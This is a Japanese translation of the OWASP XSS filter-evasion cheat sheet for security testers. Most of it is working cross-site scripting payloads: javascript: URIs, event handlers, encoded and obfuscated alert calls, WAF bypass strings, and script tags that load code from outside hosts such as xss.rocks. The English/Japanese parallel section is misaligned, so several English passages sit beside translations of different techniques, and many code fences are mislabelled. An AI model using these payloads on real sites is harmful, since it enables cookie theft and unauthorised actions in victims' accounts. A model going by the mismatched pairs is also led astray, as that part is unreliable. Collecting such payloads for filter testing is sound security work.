Directive URL scheme。この攻撃手法は、SCRIPT という語や JavaScript ディレクティブを可視的に含まないため便利である。base64 エンコーディングを利用するためである。詳細は [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) を参照すること。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

#### 追加 URL パラメータを持つ META

対象サイトが URL の先頭に `[http://]%28http://);` が含まれているか確認しようとする場合、次の手法でそのフィルタ規則を回避できる。

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert%28'XSS');">
```text

(Moritz Naumann による投稿。)

### IFRAME

iFrame が許可されている場合、他にも多くの XSS 問題が存在する。

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```text

### イベントベースの IFRAME

iFrame とほとんどの他の要素は、次のようなイベントベースの混乱を利用できる。

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```text

(David Cross による投稿。)

### FRAME

Frame には iFrame と同種の XSS 問題がある。

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```text

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```text

#### TD

上と同じように、TD は JavaScript XSS ベクタを含む BACKGROUND に対して脆弱である。

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```text

### DIV

#### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### Unicode XSS Exploit を使う DIV Background-image

これは URL パラメータを難読化するために少し変更されている。

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```text

(元の脆弱性は、Hotmail の脆弱性として Renaud Lifchitz により発見された。)

#### 追加文字を含む DIV Background-image

RSnake は、IE で開始括弧の後かつ JavaScript ディレクティブの前に許可される誤った文字を検出するため、簡易 XSS fuzzer を作成した。これらは 10 進であるが、もちろん 16 進やパディングも含められる。(次の任意の文字を使用できる: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### DIV Expression

この攻撃の変種は、コロンと `expression` の間に改行を入れることで、実環境の XSS フィルタに対して有効だった。

```html
<DIV STYLE="width: expression(alert('XSS'));">
```text

### Downlevel-Hidden Block

古い IE の downlevel-hidden 条件コメントを使い、HTML コメントとして見える領域にスクリプトを隠せる。

```html
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```text

### BASE タグ

BASE タグを使うと、相対 URL の解決先を攻撃者が制御する場所へ変えられる。末尾の `//` は、後続の文字列をコメントアウトするために使われる。

```html
<BASE HREF="javascript:alert('XSS');//">
```text

### OBJECT タグ

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```text

### XSS ベクタを含む SVG を EMBED する

この攻撃は Firefox でのみ動作する。

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```text

### CDATA 難読化を使う XML Data Island

この XSS 攻撃は IE でのみ動作する。

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```text

### XML data island で生成される JavaScript を埋め込んだローカルホスト XML

XML data island を使って、ローカルにホストされた XML 内のスクリプトを HTML に流し込む手法である。

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```text

`xsstest.xml` の内容は次のようになる。

```xml
<XSS><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></XSS>
```text

### XML 内の HTML+TIME

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>">
</BODY></HTML>
```text

### 数文字しか入らず `.js` がフィルタされる場合

短い入力しか使えず `.js` に対するフィルタがある場合でも、短縮 URL やプロトコル解決を利用して外部スクリプトへ到達できることを示す。

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```text

### SSI (Server Side Includes)

この XSS ベクタを使うには、サーバに SSI がインストールされている必要がある。言うまでもないが、サーバ上でコマンドを実行できるなら、より深刻な問題がほぼ確実に存在する。

```html
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```text

### PHP

PHP が実行されるコンテキストでは、サーバ側のコード生成や出力により XSS ベクタを構成できる。

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```text

### IMG 埋め込みコマンド

この攻撃は、Web 掲示板のように、パスワード保護された Web ページに注入され、そのパスワード保護が同じドメイン上の他のコマンドにも適用されている場合にのみ動作する。ユーザー削除、ユーザー追加 (ページを訪問したユーザーが管理者の場合)、認証情報の送信などに使われる可能性がある。あまり使われないが、より有用な XSS ベクタの一つである。

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```text

#### IMG 埋め込みコマンド part II

これはさらに怖い。自ドメインにホストされていないこと以外、疑わしく見える識別子がまったくないためである。このベクタは 302 または 304 (他のリダイレクトも動作する) を使って画像をコマンドへリダイレクトする。つまり、通常の `&lt;IMG SRC="httx://badguy.com/a.jpg">` が、画像リンクを閲覧したユーザーとしてコマンドを実行する攻撃ベクタになり得る。次は、このベクタを実現する Apache の `.htaccess` 行である。

```apacheconf
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```text

(Timo の一部貢献に謝意を示す。)

### Cookie 操作

この方法はかなり目立たないが、`&lt;META` が許可され、それを使って Cookie を上書きできる例がいくつかある。ユーザー名をデータベースから取得するのではなく、ページを訪問したユーザーだけに表示するため Cookie 内に保存しているサイトの例もある。

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```text

### HTML 引用符カプセル化を使う XSS

HTML 属性値の引用符の外へ抜け、イベントハンドラや新しいタグを注入することで XSS を作る手法である。入力が既存の属性へ埋め込まれる場合、引用符、山括弧、スペース、イベント名、URL スキームの扱いを確認する必要がある。

```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```text

```html
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```text

```html
<IMG SRC=# onmouseover="alert('xxs')">
```text

```html
<IMG SRC= onmouseover="alert('xxs')">
```text

```html
<IMG onmouseover="alert('xxs')">
```text

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```text

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```text

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```text

```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```text

```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```text

### URL 文字列回避

URL の表現は、ホスト名、IP 表記、エンコード、リダイレクト、プロトコル解決などの差異によりフィルタを迂回できることがある。

#### IP とホスト名

ホスト名の代わりに IP アドレスを使うことで、ホスト名ベースの検査を避けられる場合がある。

```text
http://66.102.7.147/
```text

#### URL エンコーディング

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d/
```text

#### DWORD エンコーディング

IP アドレスを DWORD として表現することで、単純な文字列比較を回避できる。

```text
http://1113982867/
```text

#### 16 進エンコーディング

```text
http://0x42.0x0000066.0x7.0x93/
```text

#### 8 進エンコーディング

```text
http://0102.0146.0007.00000223/
```text

#### Base64 エンコーディング

data URL などで base64 を使い、スクリプトや HTML を直接見えにくくできる。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

#### 混合エンコーディング

複数の URL・数値表現を混ぜることで、単一の正規化しか行わないフィルタを迂回できる。

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f
http://0x42.000146.0x7.147/
```text

#### プロトコル解決バイパス

スキーム相対 URL や短縮されたリソース名を使い、フィルタが想定する `http:` や `https:` の文字列を避ける。

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

#### CNAME の削除

DNS 名の別名を外し、フィルタが許可・拒否リストで想定している名前解決結果と異なる形にできる場合がある。絶対 DNS 名を示す末尾ドットも、文字列照合を揺さぶる要素になる。

```text
http://google.com./
```text

#### JavaScript Link Location

JavaScript の link location を利用し、リンク先の評価タイミングや文脈を悪用する。

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```text

#### 攻撃ベクタとしての Content Replace

コンテンツ置換処理が入力を再解釈する場合、置換後の文字列が XSS ベクタになる可能性がある。

```html
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
```text

### HTTP Parameter Pollution による XSS の補助

HTTP Parameter Pollution (HPP) は、同名パラメータの扱いがコンポーネントごとに異なることを使い、WAF とアプリケーションの解釈差を作る。次の例は、コンテンツページと共有ページの処理差により XSS を助ける流れを示す。

#### コンテンツページのソースコード

```php
<?
$content = $_GET['content'];
echo $content;
?>
```text

#### 共有ページのソースコード

```php
<?
$val = $_GET['val'];
echo '<a href="/content.php?content='.$val.'">Click here</a>';
?>
```text

#### コンテンツページの出力

```html
<script>alert(1)</script>
```text

#### 共有ページの出力

共有ページの出力は、分割されたパラメータが最終的に結合されることで、次のような XSS を形成し得る。

```html
<a href="/content.php?content=<script>alert(1)</script>">Click here</a>
```text

## 文字エスケープシーケンス

この節は、XSS フィルタを回避するために使われる JavaScript と HTML の文字エスケープ形式をまとめる。10 進、16 進、Unicode、CSS エスケープ、URL エンコード、混合エンコードなどは、フィルタが正規化前の文字列だけを見ている場合に検出を難しくする。防御側は、入力検証だけに依存せず、出力コンテキストに応じたエンコーディングと安全なサニタイズを適用し、複数段階のデコード差を前提にテストする必要がある。

```text
<SCRIPT>alert('XSS')</SCRIPT>
%3CSCRIPT%3Ealert('XSS')%3C/SCRIPT%3E
\u003cSCRIPT\u003ealert('XSS')\u003c/SCRIPT\u003e
&#x3c;SCRIPT&#x3e;alert('XSS')&#x3c;/SCRIPT&#x3e;
```text

## WAF をバイパスする方法 - Cross-Site Scripting

### 一般的な問題

#### 保存型 XSS

攻撃者がフィルタを通過して XSS を保存できた場合、WAF はその攻撃の実行を防げない。

#### JavaScript 内の反射型 XSS

例:

```javascript
<script> ... setTimeout(\"writetitle()\",$\_GET\[xss\]) ... </script>
```text

悪用:

```javascript
/?xss=500); alert(document.cookie);//
```text

#### DOM ベース XSS

例:

```javascript
<script> ... eval($\_GET\[xss\]); ... </script>
```text

悪用:

```javascript
/?xss=document.cookie
```text

#### リクエストリダイレクト経由の XSS

脆弱なコード:

```javascript
...
header('Location: '.$_GET['param']);
...
```text

同様に:

```javascript
...
header('Refresh: 0; URL='.$_GET['param']);
...
```text

このリクエストは WAF を通過しない。

```html
/?param=<javascript:alert(document.cookie>)
```text

このリクエストは WAF を通過し、特定のブラウザで XSS 攻撃が実行される。

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```text

### XSS のための WAF バイパス文字列

次の文字列は、WAF やフィルタがイベントハンドラ、要素名、エンコード、data URL、名前空間、構文の揺らぎをどのように扱うかを確認するためのテストペイロードである。

<!-- markdownlint-disable MD038-->
- `&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `&lt;Video> <source onerror = "javascript: alert (XSS)">`
- `&lt;Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `">&lt;/SCRIPT&gt;”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*&#123;x:expression(alert(/xss/))&#125;//<style></style>`

 On Mouse Over:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)">&lt;/OBJECT&gt; `
<!-- markdownlint-enable MD038-->

### フィルタバイパス Alert 難読化

次の例は、`alert` 呼び出しを別の構文やプロパティ参照、文字エスケープで表現し、単純な文字列検査を避ける手法である。

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\\u0065rt(1)`
- `top[‘al\\145rt’](1)`
- `top[‘al\\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

ペイロードには先頭と末尾のバッククォートを含める必要がある。

```javascript
&#96;`${alert``}`&#96;
```html

</section>

<section id="xss-filter-evasion-bilingual-panel" className="tabPanel bilingualPanel">

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Introduction

This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## はじめに

この記事は、アプリケーションセキュリティ専門家向けの Cross Site Scripting (XSS) テストガイドである。このチートシートは、以前 `http://ha.ckers.org/xss.html` にあった RSnake の代表的な XSS Cheat Sheet を基にしていた。現在は OWASP Cheat Sheet Series が、更新・保守された版として提供している。最初期の OWASP Cheat Sheet である [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) は RSnake の成果に着想を得たものであり、その貢献に謝意を示す。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Tests

This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## テスト

このチートシートは、特定の XSS 防御フィルタを迂回できる一連の XSS 攻撃例をテスターに示すことで、入力フィルタリングが XSS に対する不完全な防御であることを説明している。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Basic XSS Test Without Filter Evasion

This attack, which uses normal XSS JavaScript injection, serves as a baseline for the cheat sheet (the quotes are not required in any modern browser so they are omitted here):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### フィルタ回避なしの基本的な XSS テスト

通常の XSS JavaScript インジェクションを使うこの攻撃は、このチートシートの基準線となる。現代のブラウザでは引用符は不要なため、ここでは省略している。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### XSS Locator (Polyglot)

This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS ロケータ (Polyglot)

このテストは、HTML、スクリプト文字列、JavaScript、URL など複数のコンテキストで実行される「polyglot test XSS payload」を投入する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

([Gareth Heyes](https://twitter.com/garethheyes) によるこの [tweet](https://twitter.com/garethheyes/status/997466212190781445) に基づく。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Malformed A Tags

This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不正な A タグ

このテストは [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) 属性を省略し、イベントハンドラを使った XSS 攻撃を示す。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

Chrome は不足している引用符を自動的に挿入する。問題が発生する場合は引用符を省略すると、Chrome が URL やスクリプト内の不足した引用符を補う。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by David Cross, Verified on Chrome)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(David Cross による投稿、Chrome で検証済み。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Malformed IMG Tags

This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 不正な IMG タグ

この XSS 手法は、緩いレンダリングエンジンの解釈を利用して IMG タグ内に XSS ベクタを作る。これは引用符で囲む必要がある。この挙動はもともと粗いコーディングを補正するためのものだったと考えられるが、HTML タグを正しく解析することも大幅に難しくする。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(もとは Begeek による発見だが、すべてのブラウザで動作するように整理・短縮された。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### fromCharCode

If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### fromCharCode

システムがどの種類の引用符も許可しない場合、JavaScript で `fromCharCode` を `eval()` し、必要な XSS ベクタを作成できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Default SRC Tag to Get Past Filters that Check SRC Domain

This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### SRC ドメインを検査するフィルタを通過するデフォルト SRC タグ

この攻撃は多くの SRC ドメインフィルタを迂回する。イベントハンドラに JavaScript を挿入する手法は、Form、Iframe、Input、Embed など任意の HTML タグ型インジェクションにも当てはまる。また、`onblur` や `onclick` など、そのタグ種別に関連する任意のイベントに置き換えられるため、ここに挙げたインジェクションには広いバリエーションがある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC=# onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Submitted by David Cross and edited by Abdullah Hussam)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(David Cross による投稿、Abdullah Hussam による編集。)

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Default SRC Tag by Leaving it Empty

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 空にしておくデフォルト SRC タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC= onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Default SRC Tag by Leaving it out Entirely

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 完全に省略するデフォルト SRC タグ

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### On Error Alert

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### エラー時の Alert

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### IMG onerror and JavaScript Alert Encode

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### IMG onerror と JavaScript Alert のエンコード

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Embedded Tab

This approach breaks up the XSS attack:

<!-- markdownlint-disable MD010-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 10 進 HTML 文字参照

Firefox では `&lt;IMG` タグ内の `javascript:` ディレクティブを使う XSS 例が動作しないため、この手法では回避策として 10 進 HTML 文字参照を使う。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```text

```html
 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

<!-- markdownlint-enable MD010-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 末尾セミコロンなしの 10 進 HTML 文字参照

これは、文字列 `&\\#XX;` を探す XSS フィルタの迂回に有効なことが多い。多くの人は、合計 7 桁まで数値文字をパディングできることを知らないためである。また、HTML エンコード文字列を終端するにはセミコロンが必須だと誤って仮定する `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` のようなデコード処理に対しても有用である。この種の処理は実環境で確認されている。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Embedded Encoded Tab

This approach can also break up XSS:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 末尾セミコロンなしの 16 進 HTML 文字参照

この攻撃も `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` という文字列に対するフィルタに有効である。その処理は `#` 記号の後に数値文字が続くと仮定しているが、16 進 HTML 文字ではそうではない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```text

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Embedded Newline to Break Up XSS

While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 埋め込みタブ

この手法は XSS 攻撃文字列を分断する。

<!-- markdownlint-disable MD010-->

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```text

```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Example 1: Break Up XSS Attack with Embedded Carriage Return

(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

<!-- markdownlint-enable MD010-->

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Example 2: Break Up JavaScript Directive with Null

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:

</div>
<div className="bilingualBlock japanese">
